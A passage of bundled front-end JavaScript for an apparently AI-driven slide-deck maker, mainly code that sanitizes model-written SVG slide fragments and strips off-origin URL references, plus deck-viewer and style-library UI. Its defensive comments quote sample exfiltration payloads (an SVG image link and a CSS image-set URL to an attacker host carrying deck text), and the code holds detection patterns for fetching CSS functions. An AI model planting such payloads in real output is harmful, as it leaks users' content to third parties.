* each component's bounding box and a `changed` flag. This component assembles
* them into a single `<svg>` and, when the payload's epoch moves (a recompose),
* fades in only the changed components so the user can see WHICH parts of the
* slide the agent just rewrote.
*
* Why the SVG is built imperatively rather than as JSX: the fragments are opaque
* SVG source strings produced by the engine, so they have to be parsed into real
* nodes.
*
* **Every fragment is sanitized through DOMPurify in SVG mode before it is
* parsed, then walked a second time to strip off-origin URL references**
* (`setSvgFragment` below). The payload is written by a model driving the engine,
* and an SVG document can carry `<script>`, `on*` handlers and `<foreignObject>`
* — so this content is treated exactly like any other untrusted markup the
* dashboard renders, not trusted because it came from our own backend. The
* second pass exists because DOMPurify is an XSS filter and not an egress
* filter: it keeps `<image href>`, and this subtree renders on the dashboard's
* OWN origin, so a passive cross-origin GET would exfiltrate the deck. The
* subtree is additionally `pointer-events: none`.
*
* Motion respects `prefers-reduced-motion`: the reduced path renders the final
* state immediately with no staged reveal.
*/
var SVG_NS = "http://www.w3.org/2000/svg";
/** Per-component reveal stagger and fade duration (ms). */
var STAGGER_MS = 140;
var FADE_MS = 420;
/**
* Sanitize an engine-produced SVG fragment and append it to *element*.
*
* DOMPurify's SVG profile strips `<script>`, event-handler attributes,
* `<foreignObject>` and `javascript:` URLs while leaving legitimate drawing
* markup intact. This is the ONLY place a fragment becomes DOM, so the sanitize
* cannot be bypassed by a caller that forgets it.
*
* Two non-obvious requirements, both load-bearing (a test pins them):
*
* 1. **The fragment must be wrapped in `<svg>` before sanitizing.** A bare
*    `<rect>`/`<path>` is not valid HTML body content, so DOMPurify parses it in
*    an HTML context and discards it — sanitizing the fragment directly returns
*    an EMPTY string and every slide renders blank.
* 2. **`RETURN_DOM_FRAGMENT`, not a string.** Assigning sanitized SVG source to
*    `innerHTML` on an SVG element re-parses it in the HTML namespace, producing
*    HTML-namespaced elements that never paint. Taking the DOM back from
*    DOMPurify preserves the SVG namespace.
*/
/**
* A bare `<rect>`/`<path>` is not valid HTML body content, so DOMPurify returns an
* EMPTY result for it — every slide rendered blank. Wrapping in an `<svg>` root
* first is what makes the fragment parseable.
*
* Built from the tag NAME rather than two `'<svg>'`/`'</svg>'` string constants:
* the root element's name is the only real datum here, and spelling the angle
* brackets once each keeps this markup out of the i18n gate's literal scan
* without needing an exemption for a string no user will ever read.
*/
var SVG_ROOT_TAG = "svg";
var wrapInSvgRoot = (fragment) => `<${SVG_ROOT_TAG}>${fragment}</${SVG_ROOT_TAG}>`;
/**
* `RETURN_DOM_FRAGMENT` is load-bearing: assigning sanitized SVG *source* to
* `innerHTML` re-parses it in the HTML namespace, producing elements that exist
* in the DOM but never paint.
*/
var SVG_SANITIZE_CONFIG = {
	USE_PROFILES: {
		svg: true,
		svgFilters: true
	},
	RETURN_DOM_FRAGMENT: true
};
/**
* Second pass: strip every OFF-ORIGIN URL reference from the sanitized subtree.
*
* DOMPurify's SVG profile is an XSS filter, not an egress filter. It removes
* `<script>`, `on*` handlers and `javascript:` URLs, but it deliberately keeps
* `<image>`, `<feImage>` and the FuncIRI presentation attributes along with their
* `href` / `xlink:href` values — so a PASSIVE cross-origin GET survives it.
*
* That matters here because this subtree lands in the live dashboard DOM, on the
* dashboard's own origin — not inside a null-origin sandboxed frame the way the
* style boards in `BoardFrame` are. The dashboard CSP allows `img-src … https:`,
* so there is no backstop below this walk: an agent-authored
* `<image href="https://attacker.example/?d=<deck text>">` would exfiltrate the
* slide's content in the query string the moment it is appended.
*
* The rule is an allow-list, so a URL-bearing attribute we have not enumerated
* still fails closed: a reference may only be a bare same-document `#fragment`.
* Fragment refs are load-bearing — the deck's shared gradients and symbols live
* in a separate `defs` payload and every slide reaches them by id — so
* `fill="url(#grad)"` and `href="#symbolId"` MUST keep working.
*/
/** Attributes whose whole value is one URL reference (`xlink:href` localises here). */
var DIRECT_REF_ATTRS = /* @__PURE__ */ new Set(["href", "src"]);
/** Every `url(` opener, so a malformed one cannot hide from the ref matcher. */
var URL_FN_TOKEN_RE = /url\s*\(/gi;
/**
* CSS functions that FETCH, other than `url()`.
*
* `url()` is not the only way a declaration reaches the network, so a scan that
* knows only that token is a denylist with holes:
* `mask-image: image-set('https://attacker/?d=…' 1x)` carries a bare URL STRING —
* no `url(` anywhere — and `src()` is the modern spelling of the same thing.
*
* These are refused outright rather than parsed. The alternative is teaching this
* walk each function's own argument grammar (`image-set` takes resolution
* descriptors, `-webkit-image-set` differs, `src()` takes format hints), and every
* one added to CSS later would be another silent hole. The engine composes with
* presentation attributes and plain colours, so nothing legitimate here needs any
* of them — refusing is free.
*
* Deliberately matched as a FUNCTION token (name + `(`) so a property or class
* name that merely contains the word is unaffected.
*/
var FETCHING_CSS_FN_RE = /(?:^|[^\w-])(?:(?:-webkit-|-moz-|-o-)?image-set|src|image)\s*\(/i;
/** `@import`, which fetches a whole stylesheet and takes a bare string too. */
var CSS_IMPORT_RE = /@import\b/i;
/** A well-formed `url(…)`, capturing the reference with optional quoting. */
var URL_FN_REF_RE = /url\s*\(\s*(['"]?)([^'")]*)\1\s*\)/gi;
/**
* True for a reference that can only ever resolve inside this document.
*
* A leading `#` is what makes that provable: no scheme, authority or
* protocol-relative `//` prefix can precede it, so a URL parser always resolves
* the value against the current document. Absolute, protocol-relative and
* scheme-relative values all fail here.
*/
var isFragmentRef = (value) => /^#\S+$/.test(value.trim());
/**
* Inline raster bitmap, the ONE non-fragment reference `<image>` may carry.
*
* This is not a concession — it is load-bearing. The engine's compose step runs
* every fragment, the background and the shared defs through its image pass,
* which re-encodes embedded art as `data:image/webp;base64,…`. Rejecting `data:`
* wholesale would therefore blank every photo, logo and icon in every deck while
* looking secure — the same class of regression as the two the module header
* already records.
*
* It is also outside the threat model this walk exists for: a data URL is inline
* bytes, so it issues NO request and cannot carry deck text to a third party.
* `image/svg+xml` is excluded even so — it is the one subtype that is a document
* rather than a bitmap, and the engine never emits it.
*/
var DATA_BITMAP_RE = /^data:image\/(?:png|jpeg|jpg|gif|webp|avif|bmp)[;,]/i;
var isInlineBitmapRef = (value) => DATA_BITMAP_RE.test(value.trim());
/** True when *value* names no URL, or names only same-document fragments.
*
* Exported so the `bgFill` guard can be tested directly: that value is set on a
* `rect` outside `scrubExternalRefs`'s walk, so it needs its own coverage. */
function urlRefsAreLocal(value) {
	if (value.includes("\\")) return false;
	if (FETCHING_CSS_FN_RE.test(value) || CSS_IMPORT_RE.test(value)) return false;
	const openers = value.match(URL_FN_TOKEN_RE);
	if (!openers) return true;
	const refs = Array.from(value.matchAll(URL_FN_REF_RE));
	if (refs.length !== openers.length) return false;
	return refs.every((match) => isFragmentRef(match[2]));
}
/** Drop declarations in a `style` attribute that reach off-origin. */
function scrubStyleAttribute(element) {
	const raw = element.getAttribute("style");
	if (raw === null) return;
	if (raw.includes("\\")) {
		element.removeAttribute("style");
		return;
	}
	const style = element.style;
	if (!style) return;
	const names = [];
	for (let index = 0; index < style.length; index += 1) names.push(style.item(index));
	for (const name of names) if (!urlRefsAreLocal(style.getPropertyValue(name))) style.removeProperty(name);
}
/**
* Exported for tests ONLY — `setSvgFragment` is still the sole path a fragment
* becomes DOM. The test DOM's HTML parser discards `svg > style` and everything
* after it when parsing a STRING, so the one way to pin the inline-stylesheet
* rule against the shipped code is to hand this walk the subtree a real browser
* would have produced.
*/
function scrubExternalRefs(root) {
	for (const element of Array.from(root.querySelectorAll("*"))) {
		if (element.localName === "style") {
			element.remove();
			continue;
		}
		for (const attribute of Array.from(element.attributes)) {
			const local = attribute.localName;
			const value = attribute.value;
			if (local === "style") continue;
			const allowInlineBitmap = element.localName === "image";
			if (DIRECT_REF_ATTRS.has(local) ? !isFragmentRef(value) && !(allowInlineBitmap && isInlineBitmapRef(value)) : !urlRefsAreLocal(value)) element.removeAttribute(attribute.name);
		}
		scrubStyleAttribute(element);
	}
}
function setSvgFragment(element, fragment) {
	const wrapper = purify_default.sanitize(wrapInSvgRoot(fragment), SVG_SANITIZE_CONFIG).firstChild;
	if (!wrapper) return;
	scrubExternalRefs(wrapper);
	while (wrapper.firstChild) element.appendChild(wrapper.firstChild);
}
function SlidePreview({ composeUrl, defs, label }) {
	const hostRef = useRef(null);
	const defsRef = useRef(defs);
	defsRef.current = defs;
	const lastUrlRef = useRef("");
	const timersRef = useRef([]);
	const [failed, setFailed] = useState(false);
	const defsReady = Boolean(defs?.defs);
	useEffect(() => {
		let cancelled = false;
		const clearTimers = () => {
			timersRef.current.forEach((id) => window.clearTimeout(id));
			timersRef.current = [];
		};
		const reduced = typeof window !== "undefined" && typeof window.matchMedia === "function" && window.matchMedia("(prefers-reduced-motion: reduce)").matches;
		const render = async () => {
			const isRecompose = Boolean(lastUrlRef.current) && lastUrlRef.current !== composeUrl;
			lastUrlRef.current = composeUrl;
			let payload;
			try {
				payload = await fetchArtifactJson(composeUrl);
			} catch {
				if (!cancelled) {
					lastUrlRef.current = "";
					setFailed(true);
				}
				return;
			}
			if (cancelled || !hostRef.current) return;
			if (payload.version !== 1) {
				setFailed(true);
				return;
			}
			setFailed(false);
			clearTimers();
			const viewBox = payload.viewBox || "0 0 1920 1080";
			const [, , vbWidth, vbHeight] = viewBox.split(" ").map(Number);
			const svg = document.createElementNS(SVG_NS, "svg");
			svg.setAttribute("viewBox", viewBox);
			svg.setAttribute("preserveAspectRatio", "xMidYMid");
			svg.setAttribute("role", "img");
			svg.setAttribute("aria-label", label);
			svg.style.width = "100%";
			svg.style.height = "100%";
			svg.style.pointerEvents = "none";
			if (payload.bgSvg) {
				const background = document.createElementNS(SVG_NS, "g");
				setSvgFragment(background, payload.bgSvg);
				svg.appendChild(background);
			} else {
				const rect = document.createElementNS(SVG_NS, "rect");
				rect.setAttribute("width", String(vbWidth || 1920));
				rect.setAttribute("height", String(vbHeight || 1080));
				const bgFill = payload.bgFill || "";
				rect.setAttribute("fill", bgFill && urlRefsAreLocal(bgFill) ? bgFill : "transparent");
				svg.appendChild(rect);
			}
			if (defsRef.current?.defs) {
				const holder = document.createElementNS(SVG_NS, "g");
				setSvgFragment(holder, defsRef.current.defs);
				while (holder.firstChild) svg.appendChild(holder.firstChild);
			}
			const animate = isRecompose && !reduced;
			const groups = [];
			const components = payload.components || [];
			components.forEach((component) => {
				const group = document.createElementNS(SVG_NS, "g");
				setSvgFragment(group, component.svg || "");
				const willAnimate = animate && Boolean(component.changed);
				group.style.opacity = willAnimate ? "0" : "1";
				if (willAnimate) group.style.transition = `opacity ${FADE_MS}ms ease-out`;
				svg.appendChild(group);
				groups.push(group);
			});
			hostRef.current.replaceChildren(svg);
			if (!animate) return;
			let step = 0;
			components.forEach((component, index) => {
				if (!component.changed) return;
				const group = groups[index];
				const delay = step * STAGGER_MS;
				step += 1;
				timersRef.current.push(window.setTimeout(() => {
					if (cancelled) return;
					group.style.opacity = "1";
				}, delay));
			});
		};
		render();
		return () => {
			cancelled = true;
			clearTimers();
		};
	}, [
		composeUrl,
		defsReady,
		label
	]);
	return /* @__PURE__ */ jsxs("div", {
		className: "relative w-full rounded-lg overflow-hidden border border-border bg-bg-elevated",
		style: { paddingBottom: SLIDE_ASPECT },
		children: [/* @__PURE__ */ jsx("div", {
			ref: hostRef,
			className: "absolute inset-0"
		}), failed && /* @__PURE__ */ jsxs("div", {
			className: "absolute inset-0 flex items-center justify-center gap-1.5 text-[12px] text-muted",
			children: [/* @__PURE__ */ jsx(AlertTriangle, { className: "lucide-inline" }), i18nT("apps.pptxMaker.slidePreview.preview_unavailable")]
		})]
	});
}
// src/DeckViewer.tsx
/**
* DeckViewer — the tabbed deliverable viewer for one deck.
*
* Four tabs in the order the agent produces them: Brief, Outline, Art direction,
* Slides. The tab follows whichever deliverable was written most recently (see
* `tabToFollow`), which is what makes the panel narrate a deck being built rather
* than sitting on whatever the user last clicked.
*/
/** Put *text* on the clipboard; false when the browser refused. */
async function copyText(text) {
	try {
		await navigator.clipboard.writeText(text);
		return true;
	} catch {
		return false;
	}
}
function tabLabel(tab) {
	switch (tab) {
		case "brief": return i18nT("apps.pptxMaker.deckViewer.tab_brief");
		case "outline": return i18nT("apps.pptxMaker.deckViewer.tab_outline");
		case "artDirection": return i18nT("apps.pptxMaker.deckViewer.tab_art_direction");
		default: return i18nT("apps.pptxMaker.deckViewer.tab_slides");
	}
}
/** A markdown deliverable, re-read on a slow poll so edits appear live. */
function DocumentTab({ path }) {
	const { data, isLoading, isError } = useQuery({
		queryKey: [
			"pptx-maker",
			"doc",
			path
		],
		queryFn: () => fetchArtifactText(path),
		refetchInterval: POLL_DOC_MS
	});
	if (isLoading) return /* @__PURE__ */ jsx("div", {
		className: "text-sm text-muted",
		children: i18nT("apps.pptxMaker.deckViewer.loading")
	});
	if (isError || data === void 0) return /* @__PURE__ */ jsx("div", {
		className: "text-sm text-muted",
		children: i18nT("apps.pptxMaker.deckViewer.unavailable")
	});
	return /* @__PURE__ */ jsx("div", {
		className: "max-w-3xl",
		children: /* @__PURE__ */ jsx(MarkdownRenderer, { content: data })
	});
}
/** The art-direction board, re-read on the same slow poll. */
function BoardTab({ path }) {
	const { data, isLoading, isError } = useQuery({
		queryKey: [
			"pptx-maker",
			"board",
			path
		],
		queryFn: () => fetchArtifactText(path),
		refetchInterval: POLL_DOC_MS
	});
	if (isLoading) return /* @__PURE__ */ jsx("div", {
		className: "text-sm text-muted",
		children: i18nT("apps.pptxMaker.deckViewer.loading")
	});
	if (isError || data === void 0) return /* @__PURE__ */ jsx("div", {
		className: "text-sm text-muted",
		children: i18nT("apps.pptxMaker.deckViewer.unavailable")
	});
	return /* @__PURE__ */ jsx(BoardFrame, {
		html: data,
		title: i18nT("apps.pptxMaker.deckViewer.tab_art_direction")
	});
}
function SlidesTab({ detail, defs }) {
	if (detail.slides.length === 0) return /* @__PURE__ */ jsx(EmptyState, {
		icon: /* @__PURE__ */ jsx(Presentation, { className: "lucide-inline" }),
		title: i18nT("apps.pptxMaker.deckViewer.no_slides_yet"),
		subtitle: i18nT("apps.pptxMaker.deckViewer.slides_appear_as_the_agent_composes_them")
	});
	return /* @__PURE__ */ jsx("div", {
		className: "grid gap-4 grid-cols-[repeat(auto-fill,minmax(320px,1fr))]",
		children: detail.slides.map((slide, index) => /* @__PURE__ */ jsxs("div", { children: [slide.composeUrl ? /* @__PURE__ */ jsx(SlidePreview, {
			composeUrl: slide.composeUrl,
			defs,
			label: `${index + 1}. ${slide.slug}`
		}) : /* @__PURE__ */ jsx("div", {
			className: "relative w-full rounded-lg border border-border bg-bg-elevated",
			style: { paddingBottom: SLIDE_ASPECT }
		}), /* @__PURE__ */ jsxs("div", {
			className: "text-[12px] text-muted mt-1.5 px-0.5 truncate",
			children: [
				index + 1,
				". ",
				slide.slug
			]
		})] }, slide.slug))
	});
}
function DeckViewer({ deckId }) {
	const [tab, setTab] = useState("slides");
	const [copied, setCopied] = useState(false);
	const seenRef = useRef(null);
	const detailQuery = useQuery({
		queryKey: [
			"pptx-maker",
			"deck",
			deckId
		],
		queryFn: () => pptxMakerApi.deck(deckId),
		refetchInterval: POLL_DECK_MS
	});
	const detail = detailQuery.data;
	const defsQuery = useQuery({
		queryKey: [
			"pptx-maker",
			"defs",
			detail?.defsUrl ?? ""
		],
		queryFn: () => fetchArtifactJson(detail?.defsUrl),
		enabled: Boolean(detail?.defsUrl)
	});
	useEffect(() => {
		if (!detail) return;
		const follow = tabToFollow(seenRef.current, detail.updatedAt);
		seenRef.current = detail.updatedAt;
		if (follow) setTab(follow);
	}, [detail]);
	useEffect(() => {
		seenRef.current = null;
		setTab("slides");
		setCopied(false);
	}, [deckId]);
	if (detailQuery.isLoading) return /* @__PURE__ */ jsx("div", {
		className: "text-sm text-muted p-5",
		children: i18nT("apps.pptxMaker.deckViewer.loading")
	});
	if (!detail) return /* @__PURE__ */ jsx("div", {
		className: "p-5",
		children: /* @__PURE__ */ jsx(EmptyState, {
			icon: /* @__PURE__ */ jsx(Presentation, { className: "lucide-inline" }),
			title: i18nT("apps.pptxMaker.deckViewer.deck_not_found")
		})
	});
	const segments = DECK_TABS.filter((candidate) => tabAvailable(detail, candidate)).map((candidate) => ({
		key: candidate,
		label: tabLabel(candidate)
	}));
	const activeTab = tabAvailable(detail, tab) ? tab : "slides";
	return /* @__PURE__ */ jsxs("div", {
		className: "flex flex-col min-h-0 flex-1",
		children: [/* @__PURE__ */ jsxs("div", {
			className: "flex items-center gap-2 flex-wrap px-3 py-2 border-b border-border shrink-0",
			children: [
				/* @__PURE__ */ jsx(SegmentedControl, {
					segments,
					value: activeTab,
					onChange: (next) => setTab(next),
					layoutId: "pptx-deck-tab",
					collapse: false
				}),
				/* @__PURE__ */ jsx("div", { className: "flex-1" }),
				detail.dirPath && /* @__PURE__ */ jsxs("button", {
					type: "button",
					title: detail.dirPath,
					onClick: () => {
						copyText(detail.dirPath).then((ok) => setCopied(ok));
					},
					className: "inline-flex items-center gap-1 text-[12px] text-muted px-2 py-1 rounded hover:bg-bg-elevated hover:text-text transition-colors bg-transparent border-none cursor-pointer",
					children: [/* @__PURE__ */ jsx(Copy, { className: "lucide-inline" }), copied ? i18nT("apps.pptxMaker.deckViewer.folder_path_copied") : i18nT("apps.pptxMaker.deckViewer.copy_folder_path")]
				}),
				detail.pptxUrl && /* @__PURE__ */ jsxs("a", {
					href: artifactUrl(detail.pptxUrl),
					download: `${detail.name}.pptx`,
					className: "inline-flex items-center gap-1 text-[12px] text-accent px-2 py-1 rounded hover:bg-bg-elevated transition-colors",
					children: [/* @__PURE__ */ jsx(ExternalLink, { className: "lucide-inline" }), i18nT("apps.pptxMaker.deckViewer.download_pptx")]
				})
			]
		}), /* @__PURE__ */ jsxs("div", {
			className: "flex-1 min-w-0 overflow-y-auto p-5",
			children: [
				activeTab === "slides" && /* @__PURE__ */ jsx(SlidesTab, {
					detail,
					defs: defsQuery.data ?? null
				}),
				activeTab === "artDirection" && detail.specs.artDirection && /* @__PURE__ */ jsx(BoardTab, { path: detail.specs.artDirection }),
				(activeTab === "brief" || activeTab === "outline") && detail.specs[activeTab] && /* @__PURE__ */ jsx(DocumentTab, { path: detail.specs[activeTab] })
			]
		})]
	});
}
// src/hostSdk.ts
/**
* Host names added at App Kit level 1, feature-detected.
*
* A named import of an export the host's module does not have fails the whole
* bundle at link time, so a host older than these seams would show a broken page
* instead of a slightly plainer one. These names are therefore read off namespace
* imports, each through an `in` check, and each has a local fallback. Names every
* supported host has are named-imported where they are used.
*/
/** Spread onto a control that removes something; the guide shows its caution line there. */
var caution = ("guideCaution" in ui ? ui.guideCaution : void 0) ?? {};
// src/LibraryPanel.tsx
/**
* LibraryPanel — the style and template library.
*
* Two lists, one detail pane. A style is the visual mood; a template is the .pptx
* slide layouts. Bundled entries are read-only; the user's own can be renamed,
* deleted, pinned (styles) and imported.
*
* Every mutation goes through React Query so the list refreshes from the server
* rather than from optimistic local state — the agent writes styles too, so the
* server is the only honest source of what exists.
*/
/**
* Font specimen for the template's theme preview.
*
* A catalog value rather than a code constant, even though the default is the
* Latin `Aa`: the two characters exist to SHOW a typeface's letterforms, so a
* locale whose readers cannot judge a font from Latin glyphs should be able to
* ship its own specimen. That makes this ordinary translatable copy — unlike the
* chat token below, nothing parses it.
*/
var fontSpecimen = () => i18nT("apps.pptxMaker.libraryPanel.font_specimen");
/**
* The chat token this panel tells the user to paste, e.g. `[Style: my-deck]`.
*
* Deliberately NOT a catalog value: the agent prompts parse exactly this spelling
* — see `skills/pptx-maker/SKILL.md` and `prompts/spec-studio.md` — so a
* translated keyword would render a token the agent does not recognise (a
* literal token the user must type is never a catalog value).
*
* Composed in one function rather than left as two loose `'Style'`/`'Template'`
* word constants, so the string shown to the user and the grammar the agent
* matches are a single expression that cannot drift.
*/
var CHAT_TOKEN_KEYWORD = {
	styles: "Style",
	templates: "Template"
};
var chatTokenFor = (kind, name) => `[${CHAT_TOKEN_KEYWORD[kind]}: ${name}]`;
function isUserOwned(entry) {
	return entry.source === "user";
}
/** Inline rename control — shown in place of the detail header while renaming. */
function RenameRow({ initial, error, onSubmit, onCancel }) {
	const [value, setValue] = useState(initial);
	const ime = useImeGuard();
	return /* @__PURE__ */ jsxs("div", {
		className: "flex items-center gap-2 mb-3 flex-wrap",
		children: [
			/* @__PURE__ */ jsx(Input, {
				autoFocus: true,
				value,
				"aria-label": i18nT("apps.pptxMaker.libraryPanel.new_name"),
				onChange: (event) => setValue(event.target.value),
				...ime.bindEnter({
					onEnter: () => onSubmit(value.trim()),
					onEscape: onCancel
				}),
				className: "flex-1 min-w-[160px]"
			}),
			/* @__PURE__ */ jsx(SendBtn, {
				onClick: () => onSubmit(value.trim()),
				children: i18nT("apps.pptxMaker.libraryPanel.save")
			}),
			/* @__PURE__ */ jsx(Btn, {
				onClick: onCancel,
				children: i18nT("apps.pptxMaker.libraryPanel.cancel")
			}),
			/* @__PURE__ */ jsx(ErrorNotice, {
				className: "w-full",
				message: error
			})
		]
	});
}
function LibraryPanel({ kind }) {
	const queryClient = useQueryClient();
	const [selected, setSelected] = useState(null);
	const [renaming, setRenaming] = useState(false);
	const [error, setError] = useState("");
	const [notice, setNotice] = useState("");
	const fileRef = useRef(null);
	const isStyles = kind === "styles";
	const listKey = ["pptx-maker", kind];
	const stylesQuery = useQuery({
		queryKey: ["pptx-maker", "styles"],
		queryFn: () => pptxMakerApi.styles(),
		enabled: isStyles
	});
	const templatesQuery = useQuery({
		queryKey: ["pptx-maker", "templates"],
		queryFn: () => pptxMakerApi.templates(),
		enabled: !isStyles
	});
	const styles = stylesQuery.data?.styles ?? [];
	const templates = templatesQuery.data?.templates ?? [];
	const entries = isStyles ? styles : templates;
	const loading = isStyles ? stylesQuery.isLoading : templatesQuery.isLoading;
	const styleHtmlQuery = useQuery({
		queryKey: [
			"pptx-maker",
			"style-html",
			selected ?? ""
		],
		queryFn: () => pptxMakerApi.style(selected),
		enabled: isStyles && Boolean(selected),
		refetchInterval: 4e3
	});
	const refresh = () => {
		queryClient.invalidateQueries({ queryKey: listKey });
	};
	const importMutation = useMutation({
		mutationFn: async (file) => {
			const name = nameFromFilename(file.name);
			return isStyles ? pptxMakerApi.importStyle(name, file) : pptxMakerApi.importTemplate(name, file);
		},
		onSuccess: (_result, file) => {
			setError("");
			setNotice("");
			setSelected(nameFromFilename(file.name));
			refresh();
		},
		onError: (err) => setError(err.message)
	});
	const renameMutation = useMutation({
		mutationFn: (vars) => isStyles ? pptxMakerApi.renameStyle(vars.name, vars.to) : pptxMakerApi.renameTemplate(vars.name, vars.to),
		onSuccess: (_result, vars) => {
			setError("");
			setRenaming(false);
			setSelected(vars.to);
			refresh();
		},
		onError: (err) => setError(err.message)
	});
	const deleteMutation = useMutation({
		mutationFn: (name) => isStyles ? pptxMakerApi.deleteStyle(name) : pptxMakerApi.deleteTemplate(name),
		onSuccess: () => {
			setError("");
			setSelected(null);
			refresh();
		},
		onError: (err) => setError(err.message)
	});
	const pinMutation = useMutation({
		mutationFn: (vars) => pptxMakerApi.pinStyle(vars.name, vars.pinned),
		onSuccess: refresh,
		onError: (err) => setError(err.message)
	});
	const current = entries.find((entry) => entry.name === selected);
	const mutable = current ? isUserOwned(current) : false;
	const currentStyle = isStyles ? current : void 0;
	const currentTemplate = !isStyles ? current : void 0;
	const accept = isStyles ? ".html" : ".pptx";
	const renderRow = (entry) => {
		const active = entry.name === selected;
		const style = isStyles ? entry : void 0;
		return /* @__PURE__ */ jsxs(Clickable, {
			onClick: () => {
				setSelected(entry.name);
				setRenaming(false);
				setError("");
			},
			className: `w-full flex items-center gap-2 text-left px-2 py-1.5 rounded-md mb-1 cursor-pointer transition-colors hover:bg-bg-elevated ${active ? "bg-bg-elevated" : ""}`,
			children: [style ? /* @__PURE__ */ jsx(BoardThumb, { html: style.coverHtml ?? "" }) : /* @__PURE__ */ jsx("div", {
				className: "flex gap-0.5 shrink-0",
				children: templateAccents((!isStyles ? entry : void 0)?.theme_colors).slice(0, 4).map((color) => /* @__PURE__ */ jsx("span", {
					className: "w-2.5 h-2.5 rounded-full",
					style: { background: color }
				}, color))
			}), /* @__PURE__ */ jsxs("div", {
				className: "min-w-0 flex-1",
				children: [/* @__PURE__ */ jsx("div", {
					className: `truncate text-sm ${active ? "text-accent" : "text-text"}`,
					children: entry.name
				}), style?.pinned && /* @__PURE__ */ jsx("div", {
					className: "text-[12px] text-accent",
					children: i18nT("apps.pptxMaker.libraryPanel.pinned")
				})]
			})]
		}, entry.name);
	};
	const section = (title, rows) => rows.length > 0 && /* @__PURE__ */ jsxs("div", {
		className: "mb-3",
		children: [/* @__PURE__ */ jsx("div", {
			className: "text-[12px] uppercase tracking-[.04em] text-muted px-1 mb-1",
			children: title
		}), rows.map(renderRow)]
	});
	return /* @__PURE__ */ jsxs(Card, {
		className: "flex flex-col min-h-0 flex-1",
		children: [
			/* @__PURE__ */ jsxs(CardTitle, { children: [
				isStyles ? i18nT("apps.pptxMaker.libraryPanel.styles") : i18nT("apps.pptxMaker.libraryPanel.templates"),
				" ",
				/* @__PURE__ */ jsx(InfoTip, { text: isStyles ? i18nT("apps.pptxMaker.libraryPanel.styles_tip") : i18nT("apps.pptxMaker.libraryPanel.templates_tip") })
			] }),
			/* @__PURE__ */ jsxs("div", {
				className: "flex items-center gap-2 mb-3 flex-wrap",
				children: [
					/* @__PURE__ */ jsxs(SendBtn, {
						onClick: () => fileRef.current?.click(),
						disabled: importMutation.isPending,
						children: [/* @__PURE__ */ jsx(Plus, { className: "lucide-inline" }), isStyles ? i18nT("apps.pptxMaker.libraryPanel.import_style") : i18nT("apps.pptxMaker.libraryPanel.import_template")]
					}),
					/* @__PURE__ */ jsx("span", {
						className: "text-[12px] text-muted",
						children: isStyles ? i18nT("apps.pptxMaker.libraryPanel.accepts_html") : i18nT("apps.pptxMaker.libraryPanel.accepts_pptx")
					}),
					/* @__PURE__ */ jsx("input", {
						ref: fileRef,
						type: "file",
						accept,
						className: "hidden",
						"aria-label": isStyles ? i18nT("apps.pptxMaker.libraryPanel.import_style") : i18nT("apps.pptxMaker.libraryPanel.import_template"),
						onChange: (event) => {
							const file = event.target.files?.[0];
							event.target.value = "";
							if (file) importMutation.mutate(file);
						}
					})
				]
			}),
			/* @__PURE__ */ jsx(ErrorNotice, {
				className: "mb-4 animate-rise",
				message: error,
				askAgent: !renaming
			}),
			notice && /* @__PURE__ */ jsx("div", {
				className: "mb-3 text-[13px] text-muted",
				children: notice
			}),
			/* @__PURE__ */ jsxs("div", {
				className: "flex flex-col sm:flex-row gap-4 flex-1 min-h-0",
				children: [/* @__PURE__ */ jsxs("div", {
					className: "w-full sm:w-56 shrink-0 max-h-[40vh] sm:max-h-none overflow-y-auto border-b sm:border-b-0 sm:border-r border-border pb-3 sm:pb-0 sm:pr-3",
					children: [
						loading && /* @__PURE__ */ jsx("div", {
							className: "text-sm text-muted px-1",
							children: i18nT("apps.pptxMaker.libraryPanel.loading")
						}),
						!loading && entries.length === 0 && /* @__PURE__ */ jsx(EmptyState, {
							icon: isStyles ? /* @__PURE__ */ jsx(Palette, { className: "lucide-inline" }) : /* @__PURE__ */ jsx(Type, { className: "lucide-inline" }),
							title: isStyles ? i18nT("apps.pptxMaker.libraryPanel.no_styles_yet") : i18nT("apps.pptxMaker.libraryPanel.no_templates_yet")
						}),
						section(i18nT("apps.pptxMaker.libraryPanel.mine"), entries.filter((entry) => isUserOwned(entry))),
						section(i18nT("apps.pptxMaker.libraryPanel.built_in"), entries.filter((entry) => !isUserOwned(entry)))
					]
				}), /* @__PURE__ */ jsxs("div", {
					className: "flex-1 min-w-0 overflow-y-auto",
					children: [
						!current && /* @__PURE__ */ jsx("div", {
							className: "text-sm text-muted",
							children: isStyles ? i18nT("apps.pptxMaker.libraryPanel.select_a_style") : i18nT("apps.pptxMaker.libraryPanel.select_a_template")
						}),
						current && renaming && /* @__PURE__ */ jsx(RenameRow, {
							initial: current.name,
							error: "",
							onSubmit: (value) => {
								if (!value || value === current.name) {
									setRenaming(false);
									return;
								}
								renameMutation.mutate({
									name: current.name,
									to: value
								});
							},
							onCancel: () => setRenaming(false)
						}),
						current && !renaming && /* @__PURE__ */ jsxs("div", {
							className: "flex items-center gap-2 mb-3 flex-wrap",
							children: [
								/* @__PURE__ */ jsx("div", {
									className: "text-sm font-medium truncate flex-1 min-w-0",
									children: current.name
								}),
								isStyles && /* @__PURE__ */ jsx(Btn, {
									"aria-label": currentStyle?.pinned ? i18nT("apps.pptxMaker.libraryPanel.unpin_style") : i18nT("apps.pptxMaker.libraryPanel.pin_style"),
									title: currentStyle?.pinned ? i18nT("apps.pptxMaker.libraryPanel.unpin_style") : i18nT("apps.pptxMaker.libraryPanel.pin_style"),
									onClick: () => pinMutation.mutate({
										name: current.name,
										pinned: !currentStyle?.pinned
									}),
									className: currentStyle?.pinned ? "text-accent" : "",
									children: /* @__PURE__ */ jsx(Pin, { className: "lucide-inline" })
								}),
								mutable && /* @__PURE__ */ jsx(Btn, {
									"aria-label": i18nT("apps.pptxMaker.libraryPanel.rename"),
									title: i18nT("apps.pptxMaker.libraryPanel.rename"),
									onClick: () => {
										setError("");
										setRenaming(true);
									},
									children: /* @__PURE__ */ jsx(Pencil, { className: "lucide-inline" })
								}),
								mutable && /* @__PURE__ */ jsx(Btn, {
									danger: true,
									...caution,
									"aria-label": i18nT("apps.pptxMaker.libraryPanel.delete"),
									title: i18nT("apps.pptxMaker.libraryPanel.delete"),
									onClick: () => deleteMutation.mutate(current.name),
									children: /* @__PURE__ */ jsx(Trash2, { className: "lucide-inline" })
								})
							]
						}),
						current && /* @__PURE__ */ jsxs("div", {
							className: "text-[12px] text-muted mb-3",
							children: [
								i18nT("apps.pptxMaker.libraryPanel.reference_in_chat"),
								" ",
								/* @__PURE__ */ jsx("code", {
									className: "font-mono text-text",
									children: chatTokenFor(kind, current.name)
